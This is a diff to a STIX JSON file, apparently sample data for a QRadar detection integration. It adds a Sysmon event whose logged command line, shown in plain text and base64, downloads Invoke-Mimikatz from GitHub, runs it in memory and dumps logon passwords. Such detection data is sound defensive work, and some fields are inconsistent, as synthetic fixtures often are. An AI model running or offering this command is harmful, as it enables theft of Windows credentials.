@@ -1400,6 +1400,87 @@
             "first_observed": "2020-01-03T16:42:58.140Z",
             "last_observed": "2020-01-03T16:42:58.140Z",
             "number_observed": 1
+        },
+        {
+            "id": "observed-data--81afa14f-5463-4251-83ba-4aac261a5ea1",
+            "type": "observed-data",
+            "created_by_ref": "identity--f165428c-7b6a-4d77-89cc-33e66a10c541",
+            "created": "2020-01-03T17:19:32.138Z",
+            "modified": "2020-01-03T17:19:32.138Z",
+            "objects": {
+                "0": {
+                    "type": "ipv4-addr",
+                    "value": "192.168.0.2",
+                    "resolves_to_refs": "2"
+                },
+                "1": {
+                    "type": "network-traffic",
+                    "src_ref": "0",
+                    "src_port": 0,
+                    "dst_ref": "3",
+                    "dst_port": 0,
+                    "protocols": [
+                        "reserved"
+                    ]
+                },
+                "2": {
+                    "type": "mac-addr",
+                    "value": "00:00:00:00:00:00"
+                },
+                "3": {
+                    "type": "ipv4-addr",
+                    "value": "192.168.0.2",
+                    "resolves_to_refs": "4"
+                },
+                "4": {
+                    "type": "mac-addr",
+                    "value": "00:00:00:00:00:00"
+                },
+                "5": {
+                    "type": "user-account",
+                    "user_id": "root"
+                },
+                "6": {
+                    "type": "artifact",
+                    "payload_bin": "PDE4Mj5PY3QgMTAgMTc6NDI6NTcgV2luU2VydmVyIEFnZW50RGV2aWNlPVdpbmRvd3NMb2cJQWdl\nbnRMb2dGaWxlPU1pY3Jvc29mdC1XaW5kb3dzLVN5c21vbi9PcGVyYXRpb25hbAlQbHVnaW5WZXJz\naW9uPTcuMi44LjE0NQlTb3VyY2U9TWljcm9zb2Z0LVdpbmRvd3MtU3lzbW9uCUNvbXB1dGVyPVdp\nblNlcnZlcglPcmlnaW5hdGluZ0NvbXB1dGVyPVdpblNlcnZlcglVc2VyPVNZU1RFTQlEb21haW49\nTlQgQVVUSE9SSVRZCUV2ZW50SUQ9MQlFdmVudElEQ29kZT0xCUV2ZW50VHlwZT00CUV2ZW50Q2F0\nZWdvcnk9MQlSZWNvcmROdW1iZXI9OTQxODgJVGltZUdlbmVyYXRlZD0xNTcwMTEwNjcwCVRpbWVX\ncml0dGVuPTE1NzAxMTA2NzAJTGV2ZWw9SW5mb3JtYXRpb25hbAlLZXl3b3Jkcz0weDgwMDAwMDAw\nMDAwMDAwMDAJVGFzaz1TeXNtb25UYXNrLVNZU01PTl9DUkVBVEVfUFJPQ0VTUwlPcGNvZGU9SW5m\nbwlNZXNzYWdlPVByb2Nlc3MgQ3JlYXRlOiBSdWxlTmFtZTogIFV0Y1RpbWU6IDIwMTktMTAtMDMg\nMTM6NTE6MTAuNTcwIFByb2Nlc3NHdWlkOiB7MUMyRDNGNTQtRkNDRS01RDk1LTAwMDAtMDAxMDc4\nRUIwQjAwfSBQcm9jZXNzSWQ6IDIyNTIgSW1hZ2U6IEM6XFdpbmRvd3NcU3lzdGVtMzJcV2luZG93\nc1Bvd2VyU2hlbGxcdjEuMFxwb3dlcnNoZWxsLmV4ZSBGaWxlVmVyc2lvbjogMTAuMC4xNDQwOS4x\nMDA1IChyczFfc3J2b29iLjE2MTIwOC0xMTU1KSBEZXNjcmlwdGlvbjogV2luZG93cyBQb3dlclNo\nZWxsIFByb2R1Y3Q6IE1pY3Jvc29mdMKuIFdpbmRvd3PCriBPcGVyYXRpbmcgU3lzdGVtIENvbXBh\nbnk6IE1pY3Jvc29mdCBDb3Jwb3JhdGlvbiBDb21tYW5kTGluZTogcG93ZXJzaGVsbCAiSUVYIChO\nZXctT2JqZWN0IE5ldC5XZWJDbGllbnQpLkRvd25sb2FkU3RyaW5nKCdodHRwczovL3Jhdy5naXRo\ndWJ1c2VyY29udGVudC5jb20vUG93ZXJTaGVsbE1hZmlhL1Bvd2VyU3Bsb2l0L21hc3Rlci9FeGZp\nbHRyYXRpb24vSW52b2tlLU1pbWlrYXR6LnBzMScpO0ludm9rZS1NaW1pa2F0eiAtQ29tbWFuZCAn\ncHJpdmlsZWdlOjpkZWJ1ZyBzZWt1cmxzYTo6bG9nb25wYXNzd29yZHMgZXhpdCciIEN1cnJlbnRE\naXJlY3Rvcnk6IEM6XFdpbmRvd3Ncc3lzdGVtMzJcIFVzZXI6IFdpblNlcnZlclxhZG1pbiBMb2dv\nbkd1aWQ6IHsxQzJEM0Y1NC1GNzM1LTVEOTUtMDAwMC0wMDIwOTQ2RDA0MDB9IExvZ29uSWQ6IDB4\nNDZkOTQgVGVybWluYWxTZXNzaW9uSWQ6IDEgSW50ZWdyaXR5TGV2ZWw6IEhpZ2ggSGFzaGVzOiBT\nSEExPUYzOTNEN0I1MzFDRDQ0Q0U0MTg2NDdGRTk1NzE1QURDM0UzQzYxRDIsTUQ1PUVCMzJDMDcw\nRTY1ODkzN0FBOUZBOUYzQUU2MjlCMkI4LFNIQTI1Nj03MEJBNTdGQjBCRjJGMzRCODY0MjZEMjE1\nNTlGNUY2RDA1QzEyNjgxOTM5MDRERThFOTU5RDdCMDZDRTk2NENFLElNUEhBU0g9QTREMzJGMUFF\nRjUyNUI4QURBNkEyNkYyODU5NkFDMkUgUGFyZW50UHJvY2Vzc0d1aWQ6IHsxQzJEM0Y1NC1GQTcy\nLTVEOTUtMDAwMC0wMDEwRTJFNjA5MDB9IFBhcmVudFByb2Nlc3NJZDogMTY2OCBQYXJlbnRJbWFn\nZTogQzpcV2luZG93c1xTeXN0ZW0zMlxjbWQuZXhlIFBhcmVudENvbW1hbmRMaW5lOiAiQzpcV2lu\nZG93c1xTeXN0ZW0zMlxjbWQuZXhlIiAK"
+                },
+                "7": {
+                    "type": "file",
+                    "hashes": {
+                        "MD5": "8D3B3D5B68A1D08485773D70C186D877",
+                        "SHA-1": "F393D7B531CD44CE418647FE95715ADC3E3C61D2",
+                        "SHA-256": "70BA57FB0BF2F34B86426D21559F5F6D05C1268193904DE8E959D7B06CE964CE",
+                        "imp": "A4D32F1AEF525B8ADA6A26F28596AC2E"
+                    },
+                    "name": "mtlserver",
+                    "parent_directory_ref": "9"
+                },
+                "8": {
+                    "type": "process",
+                    "name": "mtlserver",
+                    "binary_ref": "7",
+                    "command_line": "/etc/mtlserver"
+                },
+                "9": {
+                    "type": "directory",
+                    "path": "/etc"
+                }
+            },
+            "x_com_ibm_ariel": {
+                "devicetype": 18,
+                "qid_name": "Detected PowerShell Command to Download Content to a File or In-Memory",
+                "qid": 67500346,
+                "category_name": "Suspicious Windows Events",
+                "category_id": 7036,
+                "log_source_id": 63,
+                "log_source_name": "Custom Rule Engine-8 :: qradar",
+                "identity_ip": "0.0.0.0",
+                "utf8_payload": "<182>Oct 10 17:42:57 WinServer AgentDevice=WindowsLog\tAgentLogFile=Microsoft-Windows-Sysmon/Operational\tPluginVersion=7.2.8.145\tSource=Microsoft-Windows-Sysmon\tComputer=WinServer\tOriginatingComputer=WinServer\tUser=SYSTEM\tDomain=NT AUTHORITY\tEventID=1\tEventIDCode=1\tEventType=4\tEventCategory=1\tRecordNumber=94188\tTimeGenerated=1570110670\tTimeWritten=1570110670\tLevel=Informational\tKeywords=0x8000000000000000\tTask=SysmonTask-SYSMON_CREATE_PROCESS\tOpcode=Info\tMessage=Process Create: RuleName:  UtcTime: 2020-01-03 13:51:10.570 ProcessGuid: {1C2D3F54-FCCE-5D95-0000-001078EB0B00} ProcessId: 2252 Image: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe FileVersion: 10.0.14409.1005 (rs1_srvoob.161208-1155) Description: Windows PowerShell Product: Microsoft\u00ae Windows\u00ae Operating System Company: Microsoft Corporation CommandLine: powershell \"IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1');Invoke-Mimikatz -Command 'privilege::debug sekurlsa::logonpasswords exit'\" CurrentDirectory: C:\\Windows\\system32\\ User: WinServer\\admin LogonGuid: {1C2D3F54-F735-5D95-0000-0020946D0400} LogonId: 0x46d94 TerminalSessionId: 1 IntegrityLevel: High Hashes: SHA1=F393D7B531CD44CE418647FE95715ADC3E3C61D2,MD5=EB32C070E658937AA9FA9F3AE629B2B8,SHA256=70BA57FB0BF2F34B86426D21559F5F6D05C1268193904DE8E959D7B06CE964CE,IMPHASH=A4D32F1AEF525B8ADA6A26F28596AC2E ParentProcessGuid: {1C2D3F54-FA72-5D95-0000-0010E2E60900} ParentProcessId: 1668 ParentImage: C:\\Windows\\System32\\cmd.exe ParentCommandLine: \"C:\\Windows\\System32\\cmd.exe\" \n",
+                "magnitude": 5
+            },
+            "first_observed": "2020-01-03T16:42:58.140Z",
+            "last_observed": "2020-01-03T16:42:58.140Z",
+            "number_observed": 1
         }
     ]
 }
